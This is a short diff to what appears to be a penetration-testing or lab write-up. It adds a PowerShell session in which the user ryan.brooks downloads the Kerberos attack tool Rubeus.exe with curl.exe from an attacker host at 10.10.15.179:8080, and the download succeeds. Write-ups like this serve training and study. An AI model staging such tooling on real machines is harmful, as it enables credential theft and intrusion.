@@ -1143,3 +1143,14 @@ Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
 ╰─                                                                                                               ─╯
 
 ```
+
+``` bash
+
+PS C:\Users\ryan.brooks\Desktop> curl.exe "http://10.10.15.179:8080/Rubeus.exe" -o "Rubeus.exe"
+curl.exe "http://10.10.15.179:8080/Rubeus.exe" -o "Rubeus.exe"
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  436k  100  436k    0     0  1348k      0 --:--:-- --:--:-- --:--:-- 1355k
+PS C:\Users\ryan.brooks\Desktop>
+
+```
